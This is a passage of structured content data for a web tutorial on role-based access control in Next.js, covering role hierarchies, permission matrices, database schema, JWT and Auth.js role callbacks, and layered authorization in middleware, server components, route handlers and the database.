            content: `if (hierarchy[user.role] >= hierarchy.manager) {
    // Allow access
}`
          },
          {
            type: "paragraph",
            content: "This avoids repeatedly listing every allowed role:"
          },
          {
            type: "code",
            language: "javascript",
            content: `if (
    user.role === "manager" ||
    user.role === "admin" ||
    user.role === "superadmin"
)`
          },
          {
            type: "paragraph",
            content: "The hierarchy approach scales much better as new roles are added."
          }
        ]
      },
      {
        heading: "Example: Blog Application",
        blocks: [
          {
            type: "list",
            style: "unordered",
            items: [
              "Reader",
              "Author",
              "Editor",
              "Admin"
            ]
          },
          {
            type: "paragraph",
            content: "Permissions:"
          },
          {
            type: "paragraph",
            content: "Reader"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Read posts"
            ]
          },
          {
            type: "paragraph",
            content: "Author"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Read posts",
              "Create posts",
              "Edit own posts"
            ]
          },
          {
            type: "paragraph",
            content: "Editor"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Everything Author can do",
              "Approve posts",
              "Delete inappropriate posts"
            ]
          },
          {
            type: "paragraph",
            content: "Admin"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Everything Editor can do",
              "Manage users",
              "Manage roles",
              "Manage categories"
            ]
          }
        ]
      },
      {
        heading: "Example: E-commerce Platform",
        blocks: [
          {
            type: "list",
            style: "unordered",
            items: [
              "Customer",
              "Support Agent",
              "Inventory Manager",
              "Store Admin",
              "Super Admin"
            ]
          },
          {
            type: "paragraph",
            content: "Customer"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Browse products",
              "Purchase",
              "Track orders"
            ]
          },
          {
            type: "paragraph",
            content: "Support Agent"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Refund orders",
              "View customers",
              "Handle tickets"
            ]
          },
          {
            type: "paragraph",
            content: "Inventory Manager"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Manage products",
              "Update stock",
              "View suppliers"
            ]
          },
          {
            type: "paragraph",
            content: "Store Admin"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Manage employees",
              "Coupons",
              "Orders",
              "Reports"
            ]
          },
          {
            type: "paragraph",
            content: "Super Admin"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Multi-store management",
              "Billing",
              "Infrastructure"
            ]
          }
        ]
      },
      {
        heading: "Example: Hospital Management System",
        blocks: [
          {
            type: "list",
            style: "unordered",
            items: [
              "Patient",
              "Receptionist",
              "Nurse",
              "Doctor",
              "Department Head",
              "Hospital Admin"
            ]
          },
          {
            type: "paragraph",
            content: "Each higher role inherits lower-level capabilities while gaining responsibilities specific to its position."
          }
        ]
      },
      {
        heading: "Common Mistakes",
        blocks: [
          {
            type: "paragraph",
            content: "Giving Everyone Admin"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "User A → Admin",
              "User B → Admin",
              "User C → Admin"
            ]
          },
          {
            type: "paragraph",
            content: "This removes the purpose of RBAC and increases security risks."
          },
          {
            type: "divider"
          },
          {
            type: "paragraph",
            content: "Too Many Roles"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Junior Developer",
              "Senior Developer",
              "Developer II",
              "Developer III",
              "Developer IV",
              "Lead Developer",
              "Principal Developer",
              "Architect",
              "Senior Architect"
            ]
          },
          {
            type: "paragraph",
            content: "If these roles have identical permissions, they should be consolidated."
          },
          {
            type: "divider"
          },
          {
            type: "paragraph",
            content: "Circular Hierarchies"
          },
          {
            type: "paragraph",
            content: "Never design:"
          },
          {
            type: "output",
            content: [
              "Admin inherits Manager",
              "",
              "Manager inherits Admin"
            ]
          },
          {
            type: "paragraph",
            content: "Circular inheritance causes ambiguity and should always be avoided."
          },
          {
            type: "divider"
          },
          {
            type: "paragraph",
            content: "Hardcoding Everywhere"
          },
          {
            type: "paragraph",
            content: "Avoid scattered checks like:"
          },
          {
            type: "code",
            language: "javascript",
            content: `if (role === "admin")`
          },
          {
            type: "paragraph",
            content: "Use centralized permission helpers instead:"
          },
          {
            type: "code",
            language: "javascript",
            content: `can(user, "deletePost")`
          },
          {
            type: "paragraph",
            content: "This makes the codebase easier to maintain."
          }
        ]
      },
      {
        heading: "Role Inheritance",
        blocks: [
          {
            type: "paragraph",
            content: "Role inheritance allows one role to automatically acquire the permissions of another role. Instead of manually assigning every permission to every role, permissions flow through a predefined hierarchy."
          },
          {
            type: "paragraph",
            content: "For example:"
          },
          {
            type: "tree",
            content: `Guest
 └── View public pages

User
 └── Guest permissions
 └── Edit profile

Author
 └── User permissions
 └── Create posts

Editor
 └── Author permissions
 └── Publish posts

Admin
 └── Editor permissions
 └── Manage users`
          },
          {
            type: "paragraph",
            content: "When a user is promoted from Author to Editor, they automatically gain all Author capabilities plus the ability to publish posts. No duplicate permission assignments are required."
          }
        ]
      },
      {
        heading: "Benefits of Role Inheritance",
        blocks: [
          {
            type: "list",
            style: "unordered",
            items: [
              "Eliminates duplicate permission definitions.",
              "Makes promotion and demotion straightforward.",
              "Keeps permission management centralized.",
              "Reduces configuration errors in large systems."
            ]
          }
        ]
      },
      {
        heading: "Explicit Overrides",
        blocks: [
          {
            type: "paragraph",
            content: "In some systems, inherited permissions can be overridden. For example, a temporary contractor with the \"Manager\" role may be denied access to financial reports even though other managers have that permission. Such exceptions should be used sparingly because they complicate authorization logic."
          }
        ]
      },
      {
        heading: "Permission Matrix",
        blocks: [
          {
            type: "paragraph",
            content: "A permission matrix is a table that maps roles to allowed actions. It provides a clear overview of who can do what and is invaluable for auditing, documentation, and implementation."
          },
          {
            type: "paragraph",
            content: "Example for a blogging platform:"
          },
          {
            type: "table",
            headers: ["Permission", "Guest", "User", "Author", "Editor", "Admin"],
            rows: [
              ["Read Posts", "✅", "✅", "✅", "✅", "✅"],
              ["Comment", "❌", "✅", "✅", "✅", "✅"],
              ["Create Posts", "❌", "❌", "✅", "✅", "✅"],
              ["Edit Own Posts", "❌", "❌", "✅", "✅", "✅"],
              ["Publish Posts", "❌", "❌", "❌", "✅", "✅"],
              ["Delete Posts", "❌", "❌", "❌", "✅", "✅"],
              ["Manage Users", "❌", "❌", "❌", "❌", "✅"],
              ["Manage Roles", "❌", "❌", "❌", "❌", "✅"]
            ]
          },
          {
            type: "paragraph",
            content: "Rather than scattering authorization checks throughout the application, developers can reference this matrix to implement consistent rules."
          },
          {
            type: "paragraph",
            content: "For larger enterprise systems, permission matrices often contain hundreds of permissions and are stored in a database rather than hardcoded."
          }
        ]
      },
      {
        heading: "Database Schema Design",
        blocks: [
          {
            type: "paragraph",
            content: "A scalable RBAC system should avoid storing permissions directly on the users table. Instead, normalize the schema by separating users, roles, permissions, and their relationships."
          }
        ]
      },
      {
        heading: "Basic RBAC Schema",
        blocks: [
          {
            type: "code",
            language: "text",
            content: `Users
-----
id
name
email

Roles
-----
id
name

Permissions
-----------
id
name

UserRoles
---------
userId
roleId

RolePermissions
---------------
roleId
permissionId`
          },
          {
            type: "paragraph",
            content: "Relationship diagram:"
          },
          {
            type: "flow",
            steps: [
              "Users", "→",
              "UserRoles", "→",
              "Roles", "→",
              "RolePermissions", "→",
              "Permissions"
            ]
          },
          {
            type: "paragraph",
            content: "This many-to-many design allows:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "One user to have multiple roles.",
              "One role to contain many permissions.",
              "One permission to belong to multiple roles."
            ]
          },
          {
            type: "paragraph",
            content: "It is highly scalable and suitable for enterprise applications."
          }
        ]
      },
      {
        heading: "Example Data",
        blocks: [
          {
            type: "paragraph",
            content: "Roles"
          },
          {
            type: "table",
            headers: ["id", "role"],
            rows: [
              ["1", "User"],
              ["2", "Editor"],
              ["3", "Admin"]
            ]
          },
          {
            type: "paragraph",
            content: "Permissions"
          },
          {
            type: "table",
            headers: ["id", "permission"],
            rows: [
              ["1", "post.read"],
              ["2", "post.create"],
              ["3", "post.publish"],
              ["4", "user.manage"]
            ]
          },
          {
            type: "paragraph",
            content: "RolePermissions"
          },
          {
            type: "table",
            headers: ["roleId", "permissionId"],
            rows: [
              ["1", "1"],
              ["2", "1"],
              ["2", "2"],
              ["2", "3"],
              ["3", "1"],
              ["3", "2"],
              ["3", "3"],
              ["3", "4"]
            ]
          },
          {
            type: "paragraph",
            content: "When a user logs in, the server resolves their roles and permissions, which can then be embedded into a session or JWT for efficient authorization checks."
          }
        ]
      },
      {
        heading: "Production Database Examples",
        blocks: [
          {
            type: "paragraph",
            content: "SaaS Project Management Platform"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Users",
              "Projects",
              "Organizations",
              "Roles",
              "Permissions",
              "OrganizationMembers",
              "ProjectMembers",
              "RolePermissions"
            ]
          },
          {
            type: "paragraph",
            content: "A user may have different roles in different organizations:"
          },
          {
            type: "output",
            content: [
              "Organization A",
              "User → Admin",
              "",
              "Organization B",
              "User → Viewer"
            ]
          },
          {
            type: "paragraph",
            content: "Authorization depends on both the user and the current organization context."
          },
          {
            type: "divider"
          },
          {
            type: "paragraph",
            content: "E-commerce Marketplace"
          },
          {
            type: "paragraph",
            content: "Roles:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Customer",
              "Seller",
              "Support",
              "Warehouse Manager",
              "Finance",
              "Admin"
            ]
          },
          {
            type: "paragraph",
            content: "Permissions include:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "orders.read",
              "orders.update",
              "products.create",
              "products.delete",
              "payments.refund",
              "inventory.manage",
              "users.manage"
            ]
          },
          {
            type: "paragraph",
            content: "Instead of checking role names, the application checks permissions:"
          },
          {
            type: "code",
            language: "javascript",
            content: `if (permissions.includes("payments.refund")) {
    // Process refund
}`
          },
          {
            type: "paragraph",
            content: "This decouples business logic from specific role names, making it easier to introduce new roles later."
          },
          {
            type: "divider"
          },
          {
            type: "paragraph",
            content: "Hospital Information System"
          },
          {
            type: "paragraph",
            content: "Roles:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Patient",
              "Nurse",
              "Doctor",
              "Pharmacist",
              "Lab Technician",
              "Department Head",
              "Hospital Administrator"
            ]
          },
          {
            type: "paragraph",
            content: "Permissions might include:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "patient.read",
              "patient.update",
              "prescription.write",
              "lab.request",
              "lab.result.view",
              "billing.manage",
              "staff.manage"
            ]
          },
          {
            type: "paragraph",
            content: "Because healthcare systems often require strict auditing, permission changes are logged, and access decisions may also consider contextual factors such as department, shift, or emergency status."
          }
        ]
      },
      {
        heading: "DevSphere Insight",
        blocks: [
          {
            type: "note",
            content: "Large organizations rarely authorize users by checking role names alone. Instead, roles are used to assign permissions, and the application enforces authorization based on permissions. This approach avoids hardcoded logic like if (role === \"admin\") and makes the system flexible enough to support new roles without changing application code. A well-designed RBAC system treats roles as collections of permissions, not as permission checks themselves."
          },
          {
            type: "divider",
          }
        ]
      },

      {
        heading: "Role-Based Access Control (RBAC) — Part 3",
        blocks: [
          {
            type: "paragraph",
            content: "JWT Roles, NextAuth Roles, Middleware Integration, Protecting Server Components, Protecting Route Handlers, Complete Production Code Examples & Best Practices"
          },
          {
            type: "paragraph",
            content: "In the previous parts, we learned what RBAC is, why it exists, how users, roles and permissions relate to each other, and how to design scalable permission databases."
          },
          {
            type: "paragraph",
            content: "Now we'll connect RBAC with a real Next.js application."
          },
          {
            type: "paragraph",
            content: "This is where RBAC actually becomes useful."
          },
          {
            type: "paragraph",
            content: "A production application doesn't simply store roles in a database."
          },
          {
            type: "paragraph",
            content: "It must:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "authenticate users",
              "attach roles to the session",
              "protect pages",
              "protect APIs",
              "protect Server Components",
              "protect Route Handlers",
              "protect databases",
              "protect admin actions"
            ]
          },
          {
            type: "paragraph",
            content: "This lesson covers the complete integration workflow."
          }
        ]
      },
      {
        heading: "RBAC in a Complete Next.js Application",
        blocks: [
          {
            type: "paragraph",
            content: "A production RBAC system usually looks like this:"
          },
          {
            type: "flow",
            steps: [
              "User", "→",
              "Login (NextAuth/Auth.js)", "→",
              "Authentication Completed", "→",
              "User Session / JWT Created", "→",
              "role = \"admin\"", "→",
              "Middleware checks route", "→",
              "Allowed?", "→",
              "Yes\nServer Components\nRoute Handlers\nDatabase Queries", "→",
              "No\nRedirect\n403 Page"
            ]
          },
          {
            type: "paragraph",
            content: "Notice something important:"
          },
          {
            type: "paragraph",
            content: "Authentication only proves identity."
          },
          {
            type: "paragraph",
            content: "RBAC decides authorization."
          },
          {
            type: "paragraph",
            content: "Never mix them."
          }
        ]
      },
      {
        heading: "Where should roles be stored?",
        blocks: [
          {
            type: "paragraph",
            content: "Roles should come from the database."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "output",
            content: [
              "User",
              "",
              "id",
              "name",
              "email",
              "role"
            ]
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "code",
            language: "json",
            content: `{
 id: 15,
 email: "john@example.com",
 role: "editor"
}`
          },
          {
            type: "paragraph",
            content: "During login,"
          },
          {
            type: "paragraph",
            content: "the role gets copied into:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "JWT",
              "Session",
              "Server Context"
            ]
          },
          {
            type: "paragraph",
            content: "Later, every request can access it."
          }
        ]
      },
      {
        heading: "JWT Roles",
        blocks: [
          {
            type: "paragraph",
            content: "JWT is one of the most common places to store roles."
          },
          {
            type: "paragraph",
            content: "Example JWT payload"
          },
          {
            type: "code",
            language: "json",
            content: `{
 "sub":"123",
 "email":"john@example.com",
 "role":"admin"
}`
          },
          {
            type: "paragraph",
            content: "Now every request automatically contains:"
          },
          {
            type: "output",
            content: [
              "Authorization",
              "",
              "Bearer JWT"
            ]
          },
          {
            type: "paragraph",
            content: "Server verifies token."
          },
          {
            type: "paragraph",
            content: "Then reads"
          },
          {
            type: "output",
            content: [
              "role = admin"
            ]
          },
          {
            type: "paragraph",
            content: "Decision becomes easy."
          }
        ]
      },
      {
        heading: "Why store roles inside JWT?",
        blocks: [
          {
            type: "paragraph",
            content: "Advantages:"
          },
          {
            type: "paragraph",
            content: "✅ Fast"
          },
          {
            type: "paragraph",
            content: "No database query for every request."
          },
          {
            type: "paragraph",
            content: "✅ Stateless"
          },
          {
            type: "paragraph",
            content: "Works across multiple servers."
          },
          {
            type: "paragraph",
            content: "✅ Easy Middleware protection"
          },
          {
            type: "paragraph",
            content: "Middleware can decode JWT immediately."
          },
          {
            type: "paragraph",
            content: "Disadvantages"
          },
          {
            type: "paragraph",
            content: "Role changes aren't reflected immediately."
          },
          {
            type: "paragraph",
            content: "Suppose:"
          },
          {
            type: "flow",
            steps: [
              "Admin", "→",
              "demoted", "→",
              "User"
            ]
          },
          {
            type: "paragraph",
            content: "Existing JWT still says"
          },
          {
            type: "output",
            content: [
              "role=admin"
            ]
          },
          {
            type: "paragraph",
            content: "until token expires."
          },
          {
            type: "paragraph",
            content: "Solutions:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Short expiration",
              "Token refresh",
              "Version checking",
              "Session database lookup"
            ]
          }
        ]
      },
      {
        heading: "JWT Authorization Flow",
        blocks: [
          {
            type: "flow",
            steps: [
              "Login", "→",
              "Database", "→",
              "role = editor", "→",
              "JWT Created", "→",
              "role=editor", "→",
              "Browser stores cookie", "→",
              "Every request", "→",
              "JWT verified", "→",
              "role extracted", "→",
              "Permission checked"
            ]
          }
        ]
      },
      {
        heading: "Example JWT Authorization",
        blocks: [
          {
            type: "code",
            language: "typescript",
            content: `export async function GET(request: Request) {

 const token = verifyJWT(request)

 if (token.role !== "admin") {

   return Response.json(
     { error: "Forbidden" },
     { status: 403 }
   )

 }

 return Response.json({ success: true })

}`
          },
          {
            type: "paragraph",
            content: "Very simple."
          },
          {
            type: "paragraph",
            content: "Authentication verifies token."
          },
          {
            type: "paragraph",
            content: "Authorization checks role."
          }
        ]
      },
      {
        heading: "Multiple Roles inside JWT",
        blocks: [
          {
            type: "paragraph",
            content: "Instead of one role:"
          },
          {
            type: "output",
            content: [
              "role = admin"
            ]
          },
          {
            type: "paragraph",
            content: "Some applications use:"
          },
          {
            type: "code",
            language: "json",
            content: `{
 "roles":[
   "admin",
   "editor"
 ]
}`
          },
          {
            type: "paragraph",
            content: "Then"
          },
          {
            type: "code",
            language: "javascript",
            content: `roles.includes("editor")`
          },
          {
            type: "paragraph",
            content: "becomes possible."
          },
          {
            type: "paragraph",
            content: "Useful for enterprise systems."
          }
        ]
      },
      {
        heading: "Permission-based JWT",
        blocks: [
          {
            type: "paragraph",
            content: "Instead of roles:"
          },
          {
            type: "output",
            content: [
              "permissions",
              "",
              "[",
              " \"create_post\",",
              " \"delete_post\",",
              " \"edit_user\"",
              "]"
            ]
          },
          {
            type: "paragraph",
            content: "This removes one lookup layer."
          },
          {
            type: "paragraph",
            content: "Middleware directly checks permission."
          }
        ]
      },
      {
        heading: "NextAuth (Auth.js) Roles",
        blocks: [
          {
            type: "paragraph",
            content: "Most modern Next.js projects use Auth.js (formerly NextAuth)."
          },
          {
            type: "paragraph",
            content: "Roles are added during authentication."
          },
          {
            type: "paragraph",
            content: "Example user:"
          },
          {
            type: "output",
            content: [
              "Database",
              "",
              "John",
              "",
              "Role",
              "",
              "Editor"
            ]
          },
          {
            type: "paragraph",
            content: "During login:"
          },
          {
            type: "flow",
            steps: [
              "Database", "→",
              "NextAuth", "→",
              "Session", "→",
              "Browser"
            ]
          }
        ]
      },
      {
        heading: "Adding Role to JWT Callback",
        blocks: [
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "code",
            language: "javascript",
            content: `callbacks: {

 async jwt({ token, user }) {

   if (user) {
      token.role = user.role
   }

   return token

 }

}`
          },
          {
            type: "paragraph",
            content: "Now JWT contains:"
          },
          {
            type: "output",
            content: [
              "role"
            ]
          }
        ]
      },
      {
        heading: "Adding Role to Session Callback",
        blocks: [
          {
            type: "code",
            language: "javascript",
            content: `callbacks: {

 async session({ session, token }) {

    session.user.role = token.role

    return session

 }

}`
          },
          {
            type: "paragraph",
            content: "Now client receives:"
          },
          {
            type: "output",
            content: [
              "session.user.role"
            ]
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "code",
            language: "javascript",
            content: `const session = await auth()

console.log(session.user.role)`
          },
          {
            type: "paragraph",
            content: "Output"
          },
          {
            type: "output",
            content: [
              "admin"
            ]
          }
        ]
      },
      {
        heading: "Why use Session Callback?",
        blocks: [
          {
            type: "paragraph",
            content: "JWT is mainly server-side."
          },
          {
            type: "paragraph",
            content: "Session callback exposes selected information safely to the client."
          },
          {
            type: "paragraph",
            content: "Never expose unnecessary information."
          },
          {
            type: "paragraph",
            content: "Good:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "role",
              "name",
              "email"
            ]
          },
          {
            type: "paragraph",
            content: "Bad:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "password hash",
              "permissions table",
              "internal ids"
            ]
          }
        ]
      },
      {
        heading: "Role-aware Navigation",
        blocks: [
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "output",
            content: [
              "Dashboard",
              "Visible to everyone.",
              "",
              "Admin Panel",
              "Visible only to admins."
            ]
          },
          {
            type: "paragraph",
            content: "Example"
          },
          {
            type: "code",
            language: "jsx",
            content: `{
 session.user.role==="admin"
 &&

 <AdminMenu/>

}`
          },
          {
            type: "paragraph",
            content: "Simple."
          },
          {
            type: "paragraph",
            content: "But remember:"
          },
          {
            type: "paragraph",
            content: "UI hiding is NOT security."
          },
          {
            type: "paragraph",
            content: "Server must still verify permissions."
          }
        ]
      },
      {
        heading: "Middleware Integration",
        blocks: [
          {
            type: "paragraph",
            content: "Middleware protects routes before they execute."
          },
          {
            type: "paragraph",
            content: "Request arrives."
          },
          {
            type: "paragraph",
            content: "Middleware runs."
          },
          {
            type: "paragraph",
            content: "Only then page loads."
          },
          {
            type: "flow",
            steps: [
              "Browser", "→",
              "Middleware", "→",
              "Allowed?", "→",
              "Page"
            ]
          }
        ]
      },
      {
        heading: "Middleware Authorization Workflow",
        blocks: [
          {
            type: "flow",
            steps: [
              "Request", "→",
              "Read JWT", "→",
              "Verify JWT", "→",
              "Read role", "→",
              "Role allowed?", "→",
              "Yes → Continue", "→",
              "No → Redirect"
            ]
          }
        ]
      },
      {
        heading: "Example Middleware",
        blocks: [
          {
            type: "code",
            language: "javascript",
            content: `import { NextResponse } from "next/server"

export function middleware(request) {

 const role = getRole(request)

 if (
     request.nextUrl.pathname.startsWith("/admin")
     &&
     role !== "admin"
 ) {

     return NextResponse.redirect(
       new URL("/403", request.url)
     )

 }

 return NextResponse.next()

}`
          }
        ]
      },
      {
        heading: "Matcher Configuration",
        blocks: [
          {
            type: "paragraph",
            content: "Protect only selected routes."
          },
          {
            type: "code",
            language: "javascript",
            content: `export const config = {

 matcher: [

 "/admin/:path*",

 "/dashboard/:path*"

 ]

}`
          },
          {
            type: "paragraph",
            content: "Now middleware ignores"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "/",
              "blog",
              "about",
              "images"
            ]
          },
          {
            type: "paragraph",
            content: "Performance improves."
          }
        ]
      },
      {
        heading: "Multiple Role Middleware",
        blocks: [
          {
            type: "code",
            language: "javascript",
            content: `const allowed = [

 "admin",

 "manager"

]

if(!allowed.includes(role)){

 return forbidden()

}`
          }
        ]
      },
      {
        heading: "Permission Middleware",
        blocks: [
          {
            type: "paragraph",
            content: "Even better."
          },
          {
            type: "code",
            language: "javascript",
            content: `if(

!permissions.includes(

"delete_post"

)

){

return forbidden()

}`
          },
          {
            type: "paragraph",
            content: "Permission-based security scales better than checking roles everywhere."
          }
        ]
      },
      {
        heading: "Middleware Best Practice",
        blocks: [
          {
            type: "paragraph",
            content: "Middleware should perform:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "✔ Authentication",
              "✔ Basic authorization"
            ]
          },
          {
            type: "paragraph",
            content: "NOT"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "❌ Database joins",
              "❌ Heavy business logic",
              "❌ Expensive API calls"
            ]
          },
          {
            type: "paragraph",
            content: "Keep Middleware lightweight."
          }
        ]
      },
      {
        heading: "Protecting Server Components",
        blocks: [
          {
            type: "paragraph",
            content: "One of the biggest advantages of the App Router."
          },
          {
            type: "paragraph",
            content: "Server Components execute on the server."
          },
          {
            type: "paragraph",
            content: "Therefore they can safely access sessions."
          },
          {
            type: "paragraph",
            content: "Example"
          },
          {
            type: "code",
            language: "jsx",
            content: `import { auth } from "@/auth"

export default async function AdminPage(){

 const session = await auth()

 if(session?.user.role!=="admin"){

    return <h1>Forbidden</h1>

 }

 return <Dashboard/>

}`
          },
          {
            type: "paragraph",
            content: "Notice"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "No client-side redirect.",
              "Unauthorized HTML never reaches browser.",
              "Very secure."
            ]
          }
        ]
      },
      {
        heading: "Why Server Component Protection is Better",
        blocks: [
          {
            type: "paragraph",
            content: "Client protection:"
          },
          {
            type: "flow",
            steps: [
              "Browser", "→",
              "Load page", "→",
              "Check session", "→",
              "Redirect"
            ]
          },
          {
            type: "paragraph",
            content: "Protected content may briefly flash."
          },
          {
            type: "paragraph",
            content: "Server protection:"
          },
          {
            type: "flow",
            steps: [
              "Browser", "→",
              "Server checks", "→",
              "Only allowed HTML generated"
            ]
          },
          {
            type: "paragraph",
            content: "Much safer."
          }
        ]
      },
      {
        heading: "Nested Layout Protection",
        blocks: [
          {
            type: "paragraph",
            content: "Instead of protecting every page,"
          },
          {
            type: "paragraph",
            content: "protect the layout."
          },
          {
            type: "tree",
            content: `app

admin

layout.tsx

page.tsx

users

settings

reports`
          },
          {
            type: "paragraph",
            content: "Only layout performs authorization."
          },
          {
            type: "paragraph",
            content: "All children automatically become protected."
          },
          {
            type: "paragraph",
            content: "Example"
          },
          {
            type: "code",
            language: "jsx",
            content: `export default async function AdminLayout({

children

}){

 const session=await auth()

 if(session.user.role!=="admin"){

   redirect("/login")

 }

 return children

}`
          },
          {
            type: "paragraph",
            content: "One check."
          },
          {
            type: "paragraph",
            content: "Entire dashboard protected."
          }
        ]
      },
      {
        heading: "Protecting Route Handlers",
        blocks: [
          {
            type: "paragraph",
            content: "Route Handlers should always verify authorization."
          },
          {
            type: "paragraph",
            content: "Never trust frontend."
          },
          {
            type: "paragraph",
            content: "Example"
          },
          {
            type: "code",
            language: "javascript",
            content: `export async function DELETE(){

 const session=await auth()

 if(session.user.role!=="admin"){

   return Response.json(

   {

    error:"Forbidden"

   },

   {

    status:403

   }

   )

 }

 // delete data

}`
          }
        ]
      },
      {
        heading: "Why Protect APIs Too?",
        blocks: [
          {
            type: "paragraph",
            content: "Suppose UI hides Delete button."
          },
          {
            type: "paragraph",
            content: "Attacker simply calls"
          },
          {
            type: "output",
            content: [
              "DELETE",
              "",
              "/api/users/12"
            ]
          },
          {
            type: "paragraph",
            content: "If API lacks authorization,"
          },
          {
            type: "paragraph",
            content: "database gets modified."
          },
          {
            type: "paragraph",
            content: "Therefore"
          },
          {
            type: "paragraph",
            content: "Always protect backend."
          },
          {
            type: "paragraph",
            content: "Never rely on frontend."
          }
        ]
      },
      {
        heading: "Protecting Server Actions",
        blocks: [
          {
            type: "paragraph",
            content: "Exactly same rule."
          },
          {
            type: "code",
            language: "javascript",
            content: `"use server"

export async function deletePost(id){

 const session=await auth()

 if(session.user.role!=="admin"){

    throw new Error("Forbidden")

 }

}`
          },
          {
            type: "paragraph",
            content: "Server Actions must perform authorization."
          }
        ]
      },
      {
        heading: "Database-level Authorization",
        blocks: [
          {
            type: "paragraph",
            content: "Suppose"
          },
          {
            type: "output",
            content: [
              "User",
              "",
              "ID=15"
            ]
          },
          {
            type: "paragraph",
            content: "tries editing"
          },
          {
            type: "output",
            content: [
              "Post",
              "",
              "Owner=23"
            ]
          },
          {
            type: "paragraph",
            content: "Database query should verify ownership."
          },
          {
            type: "paragraph",
            content: "Bad"
          },
          {
            type: "code",
            language: "sql",
            content: `UPDATE posts
SET title='Hello'
WHERE id=5`
          },
          {
            type: "paragraph",
            content: "Good"
          },
          {
            type: "code",
            language: "sql",
            content: `UPDATE posts

SET title='Hello'

WHERE

id=5

AND ownerId=15`
          },
          {
            type: "paragraph",
            content: "Database itself enforces ownership."
          },
          {
            type: "paragraph",
            content: "Very important."
          }
        ]
      },
      {
        heading: "Complete Production Authorization Flow",
        blocks: [
          {
            type: "flow",
            steps: [
              "User", "→",
              "Login", "→",
              "Auth.js", "→",
              "JWT", "→",
              "Middleware", "→",
              "Server Component", "→",
              "Route Handler", "→",
              "Database Ownership Check", "→",
              "Response"
            ]
          },
          {
            type: "paragraph",
            content: "Notice"
          },
          {
            type: "paragraph",
            content: "Authorization exists at multiple layers."
          },
          {
            type: "paragraph",
            content: "This is called Defense in Depth."
          },
          {
            type: "paragraph",
            content: "If one layer fails,"
          },
          {
            type: "paragraph",
            content: "others still protect the application."
          }
        ]
      },
      {
        heading: "Complete Production Example",
        blocks: [
          {
            type: "flow",
            steps: [
              "User opens", "→",
              "/admin/users", "→",
              "Middleware", "→",
              "Checks login", "→",
              "Checks role", "→",
              "Admin Layout", "→",
              "Checks session", "→",
              "Server Component", "→",
              "Loads data", "→",
              "Delete Button", "→",
              "Server Action", "→",
              "Checks role again", "→",
              "Database verifies ownership", "→",
              "Delete row", "→",
              "Success"
            ]
          },
          {
            type: "paragraph",
            content: "Several independent security checks protect the application."
          }
        ]
      },
      {
        heading: "Where Authorization Should Be Implemented",
        blocks: [
          {
            type: "table",
            headers: ["Layer", "Responsibility"],
            rows: [
              ["Middleware", "Protect routes early"],
              ["Server Components", "Protect rendered pages"],
              ["Route Handlers", "Protect APIs"],
              ["Server Actions", "Protect mutations"],
              ["Database", "Protect ownership"],
              ["UI", "Improve UX only"]
            ]
          },
          {
            type: "paragraph",
            content: "This layered approach is used in large-scale production systems."
          }
        ]
      },
      {
        heading: "Performance Considerations",
        blocks: [
          {
            type: "paragraph",
            content: "Authorization should be efficient."
          },
          {
            type: "paragraph",
            content: "Good practices:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Cache user permissions when appropriate.",
              "Keep JWT payloads compact.",
              "Avoid unnecessary database queries.",
              "Reuse authenticated session information.",
              "Perform permission checks close to the protected resource.",
              "Batch permission lookups for dashboards displaying many resources.",
              "Avoid embedding huge permission lists inside JWTs, as this increases every request's payload size."
            ]
          }
        ]
      },
      {
        heading: "RBAC Testing Checklist",
        blocks: [
          {
            type: "paragraph",
            content: "Before deploying, verify that:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Anonymous users cannot access protected routes.",
              "Logged-in users cannot access higher-privilege pages.",
              "API endpoints reject unauthorized requests.",
              "Server Actions enforce authorization.",
              "Middleware correctly redirects unauthorized users.",
              "Database ownership rules prevent unauthorized data modification.",
              "Role changes take effect after session/token refresh.",
              "Expired or revoked tokens are rejected."
            ]
          },
          {
            type: "paragraph",
            content: "Testing these scenarios prevents many real-world security issues."
          }
        ]
      },
      {
        heading: "Best Practices for Integrating RBAC into a Next.js Application",
        blocks: [
          {
            type: "paragraph",
            content: "1. Keep Authentication and Authorization Separate"
          },
          {
            type: "paragraph",
            content: "Authentication answers:"
          },
          {
            type: "output",
            content: [
              "\"Who are you?\""
            ]
          },
          {
            type: "paragraph",
            content: "Authorization answers:"
          },
          {
            type: "output",
            content: [
              "\"What are you allowed to do?\""
            ]
          },
          {
            type: "paragraph",
            content: "Never mix these responsibilities."
          },
          {
            type: "paragraph",
            content: "2. Store Roles in the Database"
          },
          {
            type: "paragraph",
            content: "Treat the database as the source of truth."
          },
          {
            type: "paragraph",
            content: "Tokens and sessions should only contain a trusted snapshot of the user's role."
          },
          {
            type: "paragraph",
            content: "3. Prefer Permissions for Complex Applications"
          },
          {
            type: "paragraph",
            content: "Instead of:"
          },
          {
            type: "code",
